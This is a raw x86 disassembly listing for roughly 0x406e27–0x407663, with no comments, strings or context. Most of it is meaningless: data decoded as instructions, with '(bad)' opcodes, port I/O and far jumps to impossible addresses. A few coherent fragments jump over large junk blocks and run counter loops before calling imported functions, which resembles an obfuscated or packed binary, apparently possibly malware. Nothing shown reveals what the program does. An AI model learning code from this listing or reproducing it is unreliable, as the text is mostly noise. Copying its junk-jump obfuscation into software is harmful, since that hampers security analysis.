  406e27:	imul   ecx,DWORD PTR [edx-0x5326ef71],0xffffff97
  406e2e:	xchg   esp,eax
  406e2f:	mov    al,0x40
  406e31:	sub    cl,BYTE PTR [eax-0x201d101c]
  406e37:	xchg   esp,eax
  406e38:	xor    BYTE PTR [ecx+0x67712f9f],ch
  406e3e:	int3   
  406e3f:	out    dx,al
  406e40:	mov    ecx,0xffad3fdb
  406e45:	pop    ecx
  406e46:	cmp    DWORD PTR [ecx],edx
  406e48:	push   cs
  406e49:	jns    0x406ec2
  406e4b:	push   ss
  406e4c:	stc    
  406e4d:	dec    esi
  406e4e:	push   ebp
  406e4f:	add    DWORD PTR [edi+0x4d],esi
  406e52:	pop    es
  406e53:	cli    
  406e54:	sbb    eax,0x98fffd0d
  406e59:	or     edi,ebx
  406e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e5c:	cmp    ecx,DWORD PTR [ebp+0x3d3b8a4b]
  406e62:	jo     0x406eb7
  406e64:	mov    cl,bl
  406e66:	(bad)  [edx+0x1b606a4e]
  406e6c:	mov    cl,0x70
  406e6e:	lods   eax,DWORD PTR ds:[esi]
  406e6f:	and    DWORD PTR [edx+eax*4+0x31265189],0xffffffe0
  406e77:	popf   
  406e78:	pop    edx
  406e79:	push   ss
  406e7a:	adc    bh,ch
  406e7c:	mov    eax,ds:0xe7c97a60
  406e81:	push   esp
  406e82:	aas    
  406e83:	xor    eax,0x58d30ff
  406e88:	and    al,0x50
  406e8a:	inc    esp
  406e8b:	add    bh,bh
  406e8d:	xor    BYTE PTR [ebp+0x44525805],cl
  406e93:	add    bh,bh
  406e95:	xor    BYTE PTR [ebp+0x44534805],cl
  406e9b:	add    bh,bh
  406e9d:	xor    BYTE PTR [edi-0x16bcbc2d],al
  406ea3:	daa    
  406ea4:	add    DWORD PTR [eax],eax
  406ea6:	add    BYTE PTR [ecx],bl
  406ea8:	retf   
  406ea9:	mov    ecx,0xd9627d6c
  406eae:	ins    DWORD PTR es:[edi],dx
  406eaf:	lods   al,BYTE PTR ds:[esi]
  406eb0:	test   eax,0xdfa77590
  406eb5:	jo     0x406e85
  406eb7:	lds    edi,FWORD PTR [esp+edi*2]
  406eba:	jl     0x406ec9
  406ebc:	jg     0x406f3a
  406ebe:	jl     0x406eda
  406ec0:	in     eax,0xe1
  406ec2:	mov    dl,0x5e
  406ec4:	imul   DWORD PTR ds:0x4249d98a
  406eca:	cmp    DWORD PTR [ecx+0x5d],esp
  406ecd:	inc    ecx
  406ece:	xor    al,0x36
  406ed0:	mul    DWORD PTR [ebp+0x608b6491]
  406ed6:	loop   0x406e99
  406ed8:	adc    DWORD PTR gs:[edx+0x5f],0xffffffb9
  406edd:	pop    esi
  406ede:	inc    esp
  406edf:	lods   al,BYTE PTR ds:[esi]
  406ee0:	sahf   
  406ee1:	cmp    ebp,DWORD PTR [edx+edx*1-0x11]
  406ee5:	arpl   WORD PTR [ebx+ebp*2],bp
  406ee8:	and    BYTE PTR [edx+0x4303b87a],0xf5
  406eef:	dec    ebp
  406ef0:	xchg   esp,eax
  406ef1:	addr16 adc bl,ch
  406ef4:	(bad)  fs:[edx]
  406ef7:	lods   eax,DWORD PTR ds:[esi]
  406ef8:	add    BYTE PTR [edi+0xe],cl
  406efb:	ja     0x406ed3
  406efd:	in     al,0x3
  406eff:	mov    esp,0x12581a43
  406f04:	mov    al,0x7a
  406f06:	sar    DWORD PTR [edi+0x61],cl
  406f09:	test   al,0xe5
  406f0b:	shl    BYTE PTR [bp+di-0x4264],0xde
  406f11:	xor    DWORD PTR [ebp+esi*1-0x471d00b6],eax
  406f18:	or     ebp,DWORD PTR [ebx-0x4003ed12]
  406f1e:	hlt    
  406f1f:	dec    esp
  406f20:	adc    esi,0x573d181d
  406f26:	add    ch,BYTE PTR [ebx+eax*4-0x10]
  406f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f2b:	pop    ds
  406f2c:	(bad)  [edi+0x56dfc352]
  406f32:	inc    ebx
  406f33:	push   esp
  406f34:	cwde   
  406f35:	pop    es
  406f36:	push   0x3b
  406f38:	shl    BYTE PTR [ebp-0x51e833a6],0xcd
  406f3f:	mov    dl,0x23
  406f41:	jbe    0x406fb8
  406f43:	xchg   edi,eax
  406f44:	xchg   BYTE PTR [edx+0x33],bl
  406f47:	clc    
  406f48:	stos   BYTE PTR es:[edi],al
  406f49:	mov    DWORD PTR [esi+0x5a295c8c],edi
  406f4f:	xor    bh,dl
  406f51:	pop    ebx
  406f52:	out    0xea,al
  406f54:	mov    ebp,fs
  406f56:	pop    ecx
  406f57:	ins    DWORD PTR es:[edi],dx
  406f58:	jae    0x406fd1
  406f5a:	dec    esi
  406f5b:	mov    edi,0x7ded1b84
  406f60:	adc    DWORD PTR [ebp+0x46],0xffffffed
  406f64:	and    bl,BYTE PTR [edx]
  406f66:	rol    ebx,0x4
  406f69:	xor    BYTE PTR [esp+edx*1+0x12a1fc6a],ch
  406f70:	pushf  
  406f71:	cmp    DWORD PTR [ebx+0x20],eax
  406f74:	imul   ebx,DWORD PTR [di-0x3c],0xeb2669e2
  406f7c:	test   eax,0x8932a33b
  406f81:	ss dec edi
  406f83:	(bad)  
  406f84:	sbb    al,0x30
  406f86:	ins    BYTE PTR es:[edi],dx
  406f87:	pop    ss
  406f88:	stos   BYTE PTR es:[edi],al
  406f89:	in     eax,dx
  406f8a:	mov    al,0xaa
  406f8c:	jg     0x406f1c
  406f8e:	push   ds
  406f8f:	shr    ecx,cl
  406f91:	call   0x53733313
  406f96:	sub    BYTE PTR [ebx-0x349ff636],dl
  406f9c:	inc    esi
  406f9d:	push   ebp
  406f9e:	cwde   
  406f9f:	add    BYTE PTR [eax],bh
  406fa1:	xor    al,BYTE PTR [edi]
  406fa3:	xchg   dl,ch
  406fa5:	retf   
  406fa6:	pop    ebx
  406fa7:	xor    ebx,ebx
  406fa9:	pop    ecx
  406faa:	aam    0x4
  406fac:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  406fae:	in     al,0x67
  406fb0:	mov    ch,0xdd
  406fb2:	pop    ebx
  406fb3:	int    0xe5
  406fb5:	ss cli 
  406fb7:	and    bl,BYTE PTR [edi+0x7f]
  406fba:	stc    
  406fbb:	xor    dh,BYTE PTR [ebx+0x1d078a5e]
  406fc1:	int3   
  406fc2:	and    DWORD PTR [ecx+edx*2-0x57c0e816],ebp
  406fc9:	cmp    esp,ebp
  406fcb:	or     al,0xe2
  406fcd:	pop    ss
  406fce:	sub    ebx,0x3
  406fd1:	push   ebx
  406fd2:	pop    eax
  406fd3:	call   DWORD PTR [eax+0x1]
  406fd6:	mov    eax,DWORD PTR [ebp-0x20]
  406fd9:	mov    ecx,DWORD PTR ds:0x44521c
  406fdf:	jmp    0x40710b
  406fe4:	gs jg  0x406fc0
  406fe7:	add    DWORD PTR [ebp-0x27],edi
  406fea:	jge    0x40703f
  406fec:	jecxz  0x406fd1
  406fee:	stos   DWORD PTR es:[edi],eax
  406fef:	ins    BYTE PTR es:[edi],dx
  406ff0:	sub    eax,0xd23bd158
  406ff5:	aas    
  406ff6:	jl     0x407074
  406ff8:	or     eax,0x1f7c7c7f
  406ffd:	shl    BYTE PTR [ebx],0x4c
  407000:	lahf   
  407001:	ds mov ebx,0xc0c9c51b
  407007:	scas   al,BYTE PTR es:[edi]
  407008:	and    al,0xd0
  40700a:	xchg   di,ax
  40700c:	(bad)  
  40700d:	out    dx,eax
  40700e:	cld    
  40700f:	icebp  
  407010:	inc    edx
  407011:	cs aas 
  407013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407014:	ja     0x406fbf
  407016:	jecxz  0x406fb7
  407018:	out    0x58,eax
  40701a:	jo     0x407016
  40701c:	push   esi
  40701d:	loope  0x407067
  40701f:	mov    al,ds:0x6ae0a272
  407024:	mov    ebp,0xad87f3bb
  407029:	(bad)  
  40702a:	out    0x99,al
  40702c:	ins    DWORD PTR es:[edi],dx
  40702d:	push   ecx
  40702e:	loope  0x406fdb
  407030:	fwait
  407031:	jno    0x4070a5
  407033:	xchg   BYTE PTR [esi+0x78],dh
  407036:	mov    edx,DWORD PTR [eax]
  407038:	cmp    dl,BYTE PTR [esi-0x1]
  40703b:	cwde   
  40703c:	test   BYTE PTR [edi+0x14],bl
  40703f:	mov    esi,0x626d0207
  407044:	cmp    bl,BYTE PTR [ecx]
  407046:	out    dx,eax
  407047:	ror    DWORD PTR [eax-0x4],0xc5
  40704b:	fsub   DWORD PTR [eax+0x3d]
  40704e:	div    eax
  407050:	mov    bl,0xba
  407052:	fist   WORD PTR [esi]
  407054:	or     al,0xe0
  407056:	sbb    eax,DWORD PTR ds:0x50ae6cce
  40705c:	pop    ecx
  40705d:	dec    edi
  40705e:	popa   
  40705f:	out    dx,al
  407060:	xchg   edx,eax
  407061:	cld    
  407062:	cmc    
  407063:	test   al,0xf0
  407065:	inc    esi
  407066:	mov    ds:0xa0e64212,al
  40706b:	ins    BYTE PTR es:[edi],dx
  40706c:	jp     0x407089
  40706e:	mov    WORD PTR [eax],ds
  407070:	stos   BYTE PTR es:[edi],al
  407071:	stos   DWORD PTR es:[edi],eax
  407072:	jle    0x407005
  407074:	out    dx,eax
  407075:	scas   eax,DWORD PTR es:[edi]
  407076:	gs fs inc esp
  407079:	xchg   esi,eax
  40707a:	scas   al,BYTE PTR es:[edi]
  40707b:	jae    0x40704d
  40707d:	or     dl,dl
  40707f:	mov    ebp,DWORD PTR [edx]
  407081:	loope  0x4070e6
  407083:	dec    edx
  407084:	jg     0x4070a2
  407086:	mov    ebp,esp
  407088:	test   DWORD PTR [eax+0x1d],0xf209c2ae
  40708f:	pop    ss
  407090:	test   al,0x32
  407092:	fimul  DWORD PTR [edi]
  407094:	ins    BYTE PTR es:[edi],dx
  407095:	out    dx,eax
  407096:	ins    DWORD PTR es:[edi],dx
  407097:	inc    edx
  407098:	sbb    ah,dh
  40709a:	add    al,BYTE PTR [ecx-0x10]
  40709d:	push   ds
  40709e:	pop    ss
  40709f:	cmp    BYTE PTR [edx+0x47],0x95
  4070a3:	push   cs
  4070a4:	dec    eax
  4070a5:	enter  0x4156,0xf3
  4070a9:	femms  
  4070ab:	mov    ch,0x7b
  4070ad:	and    dl,dl
  4070af:	mov    ah,0xb9
  4070b1:	inc    eax
  4070b2:	push   esi
  4070b3:	es inc esp
  4070b5:	mov    eax,0x5e67239e
  4070ba:	sar    DWORD PTR [esi+0x4845197],cl
  4070c0:	xlat   BYTE PTR ds:[ebx]
  4070c1:	lahf   
  4070c2:	rcr    DWORD PTR [esi],1
  4070c4:	jle    0x4070c4
  4070c6:	pop    ss
  4070c7:	js     0x4070c5
  4070c9:	imul   ebx,esi,0x6af24674
  4070cf:	bound  edx,QWORD PTR [ecx-0x2821ccd2]
  4070d5:	and    al,0x1c
  4070d7:	inc    ecx
  4070d8:	scas   al,BYTE PTR es:[edi]
  4070d9:	pop    esp
  4070da:	repnz add al,BYTE PTR [esi-0xd7f24da]
  4070e1:	push   es
  4070e2:	in     al,0x91
  4070e4:	das    
  4070e5:	and    bh,BYTE PTR [esi]
  4070e7:	lahf   
  4070e8:	mov    ebx,0x63b26744
  4070ed:	mov    edx,0x3ee63f95
  4070f2:	and    BYTE PTR [ecx+0x15],al
  4070f5:	out    dx,eax
  4070f6:	(bad)  
  4070f8:	ret    
  4070f9:	mov    al,ds:0x82d2771
  4070fe:	mov    WORD PTR [eax],fs
  407100:	or     BYTE PTR [edx],bh
  407102:	pop    edi
  407103:	mov    bh,0xe9
  407105:	scas   al,BYTE PTR es:[edi]
  407106:	sbb    BYTE PTR [eax+0x9],ch
  407109:	cdq    
  40710a:	xchg   BYTE PTR [ecx],al
  40710c:	or     BYTE PTR [edi+0x5e],bl
  40710f:	pop    ebx
  407110:	leave  
  407111:	ret    
  407112:	push   ebp
  407113:	mov    ebp,esp
  407115:	sub    esp,0x2c
  407118:	xor    eax,0x6ce
  40711d:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  407124:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40712b:	or     DWORD PTR ds:0x44e414,0x5a5
  407135:	jmp    0x40726c
  40713a:	push   ds
  40713b:	repz lock adc al,0x95
  40713f:	pop    ss
  407140:	stos   BYTE PTR es:[edi],al
  407141:	lea    edi,[esi+0x16]
  407144:	nop
  407145:	push   ebx
  407146:	sub    ah,bl
  407148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407149:	pusha  
  40714a:	jecxz  0x40718a
  40714c:	jl     0x4071ca
  40714e:	push   es
  40714f:	jg     0x4071cd
  407151:	jl     0x4070fd
  407153:	loop   0x407110
  407155:	sub    edi,DWORD PTR [eax+0xf]
  407158:	hlt    
  407159:	jno    0x4070e5
  40715b:	out    dx,eax
  40715c:	sti    
  40715d:	cmp    dh,ch
  40715f:	sbb    al,0xc7
  407161:	cmp    edi,ecx
  407163:	test   al,0x35
  407165:	loope  0x4071da
  407167:	mov    ds:0x2fd2464d,al
  40716c:	push   esi
  40716d:	mov    ecx,0x1d073729
  407172:	mov    eax,ds:0xad9b0863
  407177:	add    DWORD PTR [ebx-0x40528eb],ecx
  40717d:	jae    0x407146
  40717f:	icebp  
  407180:	cld    
  407181:	mov    cl,0xfd
  407183:	mov    eax,ds:0x24b59c38
  407188:	sbb    al,0x2a
  40718a:	mov    al,0x28
  40718c:	xor    cl,BYTE PTR [ebx]
  40718e:	sbb    edi,DWORD PTR [edx+0x7d3d113a]
  407194:	push   edi
  407195:	in     al,dx
  407196:	mov    edx,0xdb46851
  40719b:	int3   
  40719c:	push   esi
  40719d:	add    dh,BYTE PTR [eax]
  40719f:	(bad)  
  4071a0:	mov    edi,0x494e099a
  4071a5:	xchg   ecx,eax
  4071a6:	and    eax,0x959424b1
  4071ab:	mov    WORD PTR [edi],gs
  4071ad:	inc    ecx
  4071ae:	in     eax,0xd
  4071b0:	inc    edx
  4071b1:	arpl   WORD PTR [eax-0x392a2ee4],si
  4071b7:	mov    al,0x3b
  4071b9:	and    DWORD PTR [edx+0x66],0x4
  4071bd:	lods   al,BYTE PTR ds:[esi]
  4071be:	sub    DWORD PTR ds:0x470fed45,0xffffff90
  4071c5:	dec    ecx
  4071c6:	jb     0x40719a
  4071c8:	in     eax,0x23
  4071ca:	pop    es
  4071cb:	sbb    al,0xf2
  4071cd:	sub    al,0xfb
  4071cf:	mov    ecx,DWORD PTR [eax+edx*1+0x6f75d34f]
  4071d6:	mov    DWORD PTR [edx+0x40f4b84a],edx
  4071dc:	clc    
  4071dd:	bound  eax,QWORD PTR [eax]
  4071df:	jp     0x407176
  4071e1:	mov    ebx,0xb717f0f6
  4071e6:	aas    
  4071e7:	sti    
  4071e8:	inc    edx
  4071e9:	jne    0x40716b
  4071eb:	xchg   esi,eax
  4071ec:	lock fild DWORD PTR [ebp-0x6ce3510b]
  4071f3:	adc    esi,ebp
  4071f5:	mul    DWORD PTR [edi]
  4071f7:	push   edi
  4071f8:	mov    edx,0xf9bf92c6
  4071fd:	xchg   edx,eax
  4071fe:	jns    0x40727a
  407200:	mov    DWORD PTR [ebp-0x4d009f0d],eax
  407206:	add    al,0x87
  407208:	xchg   BYTE PTR ds:0x88d1ca9d,dh
  40720e:	adc    DWORD PTR [ecx],ecx
  407210:	mov    esi,esi
  407212:	inc    esp
  407213:	jae    0x40725f
  407215:	sti    
  407216:	jg     0x40719b
  407218:	sub    dh,BYTE PTR [edx+0x14013af4]
  40721e:	push   ecx
  40721f:	daa    
  407220:	loop   0x4072a1
  407222:	sub    dh,BYTE PTR [ecx-0x60]
  407225:	pop    ds
  407226:	push   eax
  407227:	xchg   edi,eax
  407228:	mov    ds:0x567f6aed,eax
  40722d:	jge    0x4071d0
  40722f:	(bad)  
  407230:	aas    
  407231:	mov    cl,0x6a
  407233:	and    ebp,DWORD PTR [ebx]
  407235:	mov    cl,0x9f
  407237:	out    0x6d,eax
  407239:	sti    
  40723a:	lea    ebp,[esi]
  40723c:	jne    0x4071f3
  40723e:	mov    cl,0x4d
  407240:	sub    ah,dl
  407242:	xor    edi,edi
  407244:	push   edx
  407245:	adc    eax,0xdcd3ca1f
  40724a:	or     ah,BYTE PTR [edx-0x54b6ada9]
  407250:	inc    edx
  407252:	push   ss
  407253:	ficom  WORD PTR [esi+0x60d03ed0]
  407259:	mov    dh,0x3b
  40725b:	call   0x942b:0x3f553e41
  407262:	cwde   
  407263:	dec    eax
  407264:	scas   eax,DWORD PTR es:[edi]
  407265:	mov    bh,0x0
  407267:	mov    bh,0x93
  407269:	or     al,0xa
  40726b:	mov    ds:0x9507b8,eax
  407270:	add    BYTE PTR [ecx+0x41074f25],al
  407276:	add    BYTE PTR [eax],al
  407278:	add    BYTE PTR [eax],al
  40727a:	add    BYTE PTR [ebx+0x41074f0d],cl
  407280:	add    BYTE PTR [ecx-0x77],al
  407283:	or     eax,0x41074f
  407288:	cmp    DWORD PTR ds:0x41074f,0x20
  40728f:	jne    0x4072a0
  407295:	push   0x4248d2
  40729a:	call   DWORD PTR ds:0x44336c
  4072a0:	cmp    DWORD PTR ds:0x41074f,0x10
  4072a7:	jb     0x40727b
  4072ad:	or     DWORD PTR ds:0x44b6dc,0x61e1
  4072b7:	mov    WORD PTR [ebp-0x4],ax
  4072bb:	xor    DWORD PTR ds:0x44b6e0,0xdd9
  4072c5:	lea    eax,[ebp-0x24]
  4072c8:	and    ecx,DWORD PTR ds:0x44b6d8
  4072ce:	jmp    0x407405
  4072d3:	div    DWORD PTR [eax]
  4072d5:	test   BYTE PTR [ebx],ah
  4072d7:	pop    ebx
  4072d8:	jnp    0x407285
  4072da:	js     0x407349
  4072dc:	ds xchg ebx,eax
  4072de:	mov    esp,0xb07a6dfe
  4072e3:	lea    esi,[ecx]
  4072e5:	jl     0x407363
  4072e7:	push   es
  4072e8:	jg     0x407366
  4072ea:	jl     0x4072c8
  4072ec:	iret   
  4072ed:	jl     0x4072da
  4072ef:	add    al,cl
  4072f1:	sar    bl,1
  4072f3:	cmp    DWORD PTR [ebx],ecx
  4072f5:	aad    0xfa
  4072f7:	fadd   st(0),st
  4072f9:	and    cl,BYTE PTR [edi]
  4072fb:	ret    0xf5d8
  4072fe:	and    DWORD PTR [ebx-0x16],ebx
  407301:	cmp    al,bh
  407303:	dec    ebx
  407304:	nop
  407305:	ror    DWORD PTR [eax+0x53b6fbb6],1
  40730b:	test   al,0xd7
  40730d:	lock jmp 0xa653:0xd6d67f0c
  407315:	adc    edx,DWORD PTR [ebx-0x57]
  407318:	fs pop esi
  40731a:	fst    QWORD PTR [ecx+0x22b4467f]
  407320:	mov    esp,0x5db2cbba
  407325:	push   cs
  407326:	jmp    0xc926:0x12e1d85
  40732d:	out    0xcd,eax
  40732f:	xchg   esi,eax
  407330:	arpl   WORD PTR [edx+0x4696945a],di
  407336:	adc    al,0xf8
  407338:	mov    ebx,0x56311708
  40733d:	idiv   cl
  40733f:	inc    ecx
  407340:	(bad)  
  407341:	jmp    0x4072e6
  407343:	adc    BYTE PTR [eax-0x1554a565],ah
  407349:	dec    eax
  40734a:	push   es
  40734b:	es push cs
  40734d:	inc    edx
  40734e:	or     eax,0x75a21445
  407353:	enter  0xe494,0xb6
  407357:	push   ebp
  407358:	or     ecx,DWORD PTR [esi+0x1d3b7905]
  40735e:	lea    ecx,[ecx-0x13126103]
  407364:	fistp  DWORD PTR [edi+0x38971baa]
  40736a:	mov    al,0xf2
  40736c:	je     0x4073df
  40736e:	mov    ah,0xaa
  407370:	pop    ebx
  407371:	dec    ecx
  407372:	jae    0x40733b
  407374:	rcr    DWORD PTR [edx+0x72f84897],1
  40737a:	es (bad) 
  40737c:	cwde   
  40737d:	jmp    DWORD PTR [ebp-0x16645694]
  407383:	imul   ebp,DWORD PTR [ebp+0x5d],0x157b9d0d
  40738a:	mov    dh,0x12
  40738c:	xor    esp,DWORD PTR [edi]
  40738e:	mov    eax,ds:0xa4ae8622
  407393:	pop    edx
  407394:	inc    ecx
  407395:	outs   dx,BYTE PTR ds:[esi]
  407396:	ins    BYTE PTR es:[edi],dx
  407397:	inc    ebp
  407398:	bound  esp,QWORD PTR [esi-0x6f]
  40739b:	jp     0x4073ac
  40739d:	jns    0x4073b7
  40739f:	in     al,0xcd
  4073a1:	jge    0x4073c4
  4073a3:	icebp  
  4073a4:	pop    ss
  4073a5:	aas    
  4073a6:	sub    DWORD PTR [ebp+0x34aadd61],0x5c
  4073ad:	push   ecx
  4073ae:	cli    
  4073af:	les    esi,FWORD PTR [eax]
  4073b1:	inc    esp
  4073b2:	inc    ecx
  4073b3:	adc    BYTE PTR [ecx+0x7c],al
  4073b6:	ror    DWORD PTR [esi-0x27],cl
  4073b9:	in     eax,dx
  4073ba:	mov    DWORD PTR [eax],ebx
  4073bc:	ins    DWORD PTR es:[edi],dx
  4073bd:	cmc    
  4073be:	dec    ecx
  4073bf:	cmp    DWORD PTR [edx+0x6ebcbe1e],ebp
  4073c5:	(bad)  
  4073c6:	jl     0x4073e0
  4073c8:	cs xor eax,0x951f7a95
  4073ce:	push   DWORD PTR [edi+eiz*4+0x50]
  4073d2:	sbb    ah,al
  4073d4:	lods   al,BYTE PTR ds:[esi]
  4073d5:	fadd   DWORD PTR cs:[ebx+eiz*2+0x36dbfb83]
  4073dd:	mov    cl,0x9c
  4073df:	sbb    BYTE PTR [edi+ecx*1],ah
  4073e2:	add    ax,0xb650
  4073e6:	repnz mov edi,DWORD PTR gs:[ecx-0x75bf14c1]
  4073ee:	sbb    edx,esi
  4073f0:	pop    esi
  4073f1:	xor    BYTE PTR [edx+ebx*1],bh
  4073f4:	or     DWORD PTR [edx+edx*4+0x1c933a24],esp
  4073fb:	sub    eax,0x492810c1
  407400:	inc    edx
  407401:	sbb    eax,0x8917f4b7
  407406:	inc    ebp
  407407:	fsubr  st,st(1)
  407409:	xor    al,BYTE PTR [ecx]
  40740b:	add    BYTE PTR [eax],al
  40740d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40740e:	(bad)  [ecx+0x67666966]
  407414:	fld    DWORD PTR [edx]
  407416:	xor    eax,0x292acc56
  40741b:	xchg   ebx,eax
  40741c:	daa    
  40741d:	xchg   edi,eax
  40741e:	xor    BYTE PTR [esp+edi*2+0x6],bh
  407422:	jg     0x4074a0
  407424:	jl     0x407459
  407426:	rcr    DWORD PTR [edi-0x78c38097],1
  40742c:	loope  0x40740c
  40742e:	outs   dx,BYTE PTR ds:[esi]
  40742f:	cmp    DWORD PTR [ebx-0x76272ca4],ecx
  407435:	cmp    cl,bh
  407437:	outs   dx,BYTE PTR ds:[esi]
  407438:	adc    cl,BYTE PTR [esp+ecx*2+0x5969015d]
  40743f:	mov    ebx,0x2fbc3507
  407444:	mov    ebx,es
  407446:	sub    BYTE PTR [eax+edi*4],dl
  407449:	int3   
  40744a:	push   ss
  40744b:	les    esp,FWORD PTR [eax-0x6e]
  40744e:	pop    edi
  40744f:	fs pop esi
  407452:	rcr    BYTE PTR [esi+0x735c3403],cl
  407458:	pop    eax
  407459:	xchg   esi,eax
  40745a:	ret    
  40745b:	aas    
  40745c:	sbb    ah,BYTE PTR [ebx]
  40745e:	push   edx
  40745f:	and    ebp,DWORD PTR [ecx+0x47537156]
  407465:	imul   ebx,DWORD PTR [ecx-0x55],0x7f800c15
  40746c:	cwde   
  40746d:	pop    esi
  40746e:	retf   
  40746f:	xchg   esi,eax
  407470:	popaw  
  407472:	lds    ebx,FWORD PTR [ecx+0xe]
  407475:	jne    0x4074c2
  407477:	repnz or DWORD PTR [edi-0x6e],0xedcc034c
  40747f:	je     0x407463
  407481:	dec    ebp
  407482:	fnsave [eax-0x42b0fc09]
  407488:	jne    0x407491
  40748a:	mov    ebx,0x70c4c62f
  40748f:	jo     0x4074f8
  407491:	add    al,0xe9
  407493:	std    
  407494:	pushf  
  407495:	push   DWORD PTR [ecx]
  407497:	mov    esi,0x57453d23
  40749c:	xchg   edx,eax
  40749d:	retf   
  40749e:	dec    ebp
  40749f:	or     eax,0x9864c59
  4074a4:	sub    BYTE PTR [edx+0x7c],ah
  4074a7:	ja     0x40750b
  4074a9:	mov    esi,0x39d48e61
  4074ae:	sbb    dl,BYTE PTR [eax+ecx*4+0x71]
  4074b2:	test   al,0xa9
  4074b4:	xor    esi,edi
  4074b6:	lods   al,BYTE PTR ds:[esi]
  4074b7:	adc    eax,0x8cd5de48
  4074bc:	loop   0x40752d
  4074be:	div    dh
  4074c0:	sub    BYTE PTR [edi+ebx*8+0x9bf5aff],0x26
  4074c8:	fadd   QWORD PTR [eax]
  4074ca:	pop    esp
  4074cb:	rcl    BYTE PTR [edx+ebp*1],1
  4074ce:	inc    esi
  4074cf:	add    cl,0xc7
  4074d2:	jg     0x40749b
  4074d4:	sahf   
  4074d5:	xor    eax,0xabd12fc1
  4074da:	push   edi
  4074db:	imul   edx,DWORD PTR [ebx+0x18],0xd
  4074df:	out    0x1b,al
  4074e1:	and    al,0x79
  4074e3:	dec    ecx
  4074e4:	int    0xd4
  4074e6:	rcr    edi,0xcc
  4074e9:	ret    0xf8f5
  4074ec:	sub    esi,DWORD PTR [ecx+0x5f]
  4074ef:	(bad)  
  4074f0:	jg     0x407555
  4074f2:	cdq    
  4074f3:	clc    
  4074f4:	fs inc ebp
  4074f6:	mov    esp,0xe037ca9e
  4074fb:	pop    edi
  4074fc:	cmp    BYTE PTR [ecx-0x36d8d15],al
  407502:	int    0xa8
  407504:	mov    ebp,0x706a3a50
  407509:	mov    al,ds:0x10aa2c5
  40750e:	cdq    
  40750f:	cwde   
  407510:	inc    esp
  407511:	xor    eax,0xd0cc524b
  407516:	jno    0x40751f
  407518:	sub    BYTE PTR [edx+ebx*1+0x28bb9d61],dh
  40751f:	mov    ah,0x8e
  407521:	jb     0x407503
  407523:	fisttp WORD PTR [edx+0x4d0f0add]
  407529:	jg     0x4074f1
  40752b:	int3   
  40752c:	sbb    DWORD PTR ds:0xe8bfd5e2,ebx
  407532:	scas   eax,DWORD PTR es:[edi]
  407533:	pop    eax
  407534:	add    al,0x3e
  407536:	das    
  407537:	adc    eax,0xfa2974ec
  40753c:	cwde   
  40753d:	lods   al,BYTE PTR ds:[esi]
  40753e:	pushf  
  40753f:	mov    eax,DWORD PTR [ebp+0x8]
  407542:	add    ecx,DWORD PTR ds:0x44b6e0
  407548:	mov    DWORD PTR [ebp-0x20],eax
  40754b:	sbb    ecx,0x41ef
  407551:	push   ebx
  407552:	lea    eax,[ebp-0x18]
  407555:	mov    DWORD PTR [ebp-0x1c],eax
  407558:	mov    eax,DWORD PTR [ebp-0x1c]
  40755b:	adc    DWORD PTR ds:0x44e410,ecx
  407561:	push   esi
  407562:	push   edi
  407563:	mov    edi,0xf89f2dad
  407568:	or     DWORD PTR ds:0x44b6d8,0x25a
  407572:	mov    DWORD PTR [eax],edi
  407574:	mov    eax,DWORD PTR [ebp-0x14]
  407577:	mov    ebx,DWORD PTR [ebp-0x8]
  40757a:	and    esi,0x501d
  407580:	mov    ecx,0x7510857
  407585:	xor    eax,ecx
  407587:	and    DWORD PTR ds:0x4248de,0x0
  407591:	xor    esi,esi
  407593:	or     esi,DWORD PTR ds:0x4248de
  407599:	inc    esi
  40759a:	mov    DWORD PTR ds:0x4248de,esi
  4075a0:	cmp    DWORD PTR ds:0x4248de,0x24
  4075a7:	jne    0x4075b8
  4075ad:	push   0x41088a
  4075b2:	call   DWORD PTR ds:0x443374
  4075b8:	cmp    DWORD PTR ds:0x4248de,0x18
  4075bf:	jb     0x407591
  4075c5:	mov    esi,0x32729e
  4075ca:	adc    DWORD PTR ds:0x44e418,0x44e40c
  4075d4:	jmp    0x40770b
  4075d9:	adc    dh,al
  4075db:	in     al,0x9d
  4075dd:	data16 jge 0x407635
  4075e0:	mov    ebx,0x5b1ba91b
  4075e5:	jmp    FWORD PTR [edx+ebx*4+0x7c33b1e0]
  4075ec:	jl     0x4075f4
  4075ee:	jg     0x40766c
  4075f0:	jl     0x4075a9
  4075f2:	lea    eax,[esp+ebx*2-0x19]
  4075f6:	add    BYTE PTR [ecx],cl
  4075f8:	outs   dx,DWORD PTR ds:[esi]
  4075f9:	jle    0x407594
  4075fb:	lods   ax,WORD PTR ds:[esi]
  4075fd:	jbe    0x407652
  4075ff:	push   es
  407600:	out    dx,al
  407601:	inc    edi
  407602:	imul   edi,DWORD PTR [ecx],0x2b
  407605:	setge  BYTE PTR es:[ecx]
  407609:	cli    
  40760a:	out    dx,al
  40760b:	dec    eax
  40760c:	pop    ebx
  40760d:	test   DWORD PTR [ebp-0x626151b1],eax
  407613:	ins    DWORD PTR es:[edi],dx
  407614:	out    dx,eax
  407615:	outs   dx,DWORD PTR ds:[esi]
  407616:	sbb    ch,bl
  407618:	pop    ss
  407619:	mov    DWORD PTR [esi],ecx
  40761b:	mov    ds:0xaa175b24,eax
  407620:	retf   0xcc7d
  407623:	ficomp DWORD PTR [ebx-0x6f]
  407626:	push   edi
  407627:	bound  ecx,QWORD PTR ds:[esi-0x54]
  40762b:	dec    esp
  40762c:	hlt    
  40762d:	call   0x6799b5d5
  407632:	out    0x6f,eax
  407634:	pop    esi
  407635:	test   al,0xfa
  407637:	xchg   edi,eax
  407638:	fcmovnb st,st(2)
  40763a:	in     al,dx
  40763b:	bound  ebx,QWORD PTR [ebp+0x75]
  40763e:	and    bl,ah
  407640:	pop    eax
  407641:	xor    eax,0xd24ad109
  407646:	xlat   BYTE PTR ds:[ebx]
  407647:	(bad)  
  407648:	dec    ebp
  407649:	inc    esi
  40764a:	push   0x8c4a2bfd
  40764f:	rol    DWORD PTR [edx-0x5d1a0da6],1
  407655:	jl     0xa4d92581
  40765b:	jmp    0x18a5:0x7f200b80
  407662:	cld    
  407663:	pushf  
